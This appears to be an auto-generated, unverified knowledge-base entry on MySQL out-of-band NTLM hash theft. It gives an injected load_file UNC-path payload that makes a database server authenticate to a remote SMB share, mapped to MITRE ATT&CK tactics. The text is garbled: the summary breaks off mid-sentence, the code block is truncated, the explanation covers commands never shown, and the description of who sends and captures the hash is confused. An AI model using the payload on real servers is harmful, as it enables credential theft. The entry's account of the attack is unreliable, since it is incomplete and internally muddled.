---
id: e1e466e7-0b98-4dc8-834d-9c0ae115d624
name: MYSQL Out of Band UNC Path Hash Stealing
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:35.076838+00:00'
updated_at: '2023-04-10T20:22:57.991491+00:00'
tactics:
- '[[Discovery|TA0007 - Discovery]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]'
- '[[Query Registry|T1012 - Query Registry]]'
tags:
- '[[MYSQL Injection]]'
- '[[MYSQL Out of band]]'
- '[[UNC Path - NTLM hash stealing]]'
---

# MYSQL Out of Band UNC Path Hash Stealing

## Summary

MYSQL Out of Band UNC Path Hash Stealing is a technique that allows an attacker to steal NTLM hashes from a remote Windows machine by injecting malicious SQL code into a MYSQL database. This technique takes advantage of the fact that MYSQL supports the UNC path syntax, which enables an attacker to 

## Description

# Description

MYSQL Out of Band UNC Path Hash Stealing is a technique that allows an attacker to steal NTLM hashes from a remote Windows machine by injecting malicious SQL code into a MYSQL database. This technique takes advantage of the fact that MYSQL supports the UNC path syntax, which enables an attacker to send an SMB request to the remote Windows machine and capture the NTLM hash. This technique can be used to escalate privileges and gain access to sensitive information.

To execute this attack, the attacker needs to have valid credentials to access the MYSQL database. The attacker then injects a malicious SQL query that includes the UNC path to the remote Windows machine. When the query is executed, the MYSQL server sends an SMB request to the remote machine, which includes the attacker's authentication credentials. The remote machine responds with the requested data and the NTLM hash, which the attacker can capture and use for further attacks.

This technique is valuable for attackers because it allows them to steal NTLM hashes without being detected by traditional security measures such as antivirus software or intrusion detection systems.

 

## Requirements

1. Valid credentials to access the MYSQL database

1. Access to the remote Windows machine through SMB

 

## Defense

1. Use strong and unique passwords to prevent credential theft

1. Implement network segmentation to prevent lateral movement

1. Monitor network traffic for suspicious activity

 

## Objectives

1. Steal NTLM hashes from a remote Windows machine

1. Escalate privileges and gain access to sensitive information

 

# Instructions

1. These commands are used to access files on the server through SQL queries.

 



**Code**: [[select load_file('\\\\error\\abc');
select load_fi]]



> The 'load_file' command is used to read the contents of a file from the server's file system. The first argument of the command is the path of the file to be read. The 'into dumpfile' and 'into outfile' commands are used to write data to a file on the server's file system. The argument of these commands is the path of the file to be written. The 'load data infile' command is used to load data from a file into a table in the database. The argument of this command is the path of the file to be loaded.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery|TA0007 - Discovery]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Exploitation of Remote Services|T1210 - Exploitation of Remote Services]]
- [[Query Registry|T1012 - Query Registry]]

## Tags

- [[MYSQL Injection]]
- [[MYSQL Out of band]]
- [[UNC Path - NTLM hash stealing]]


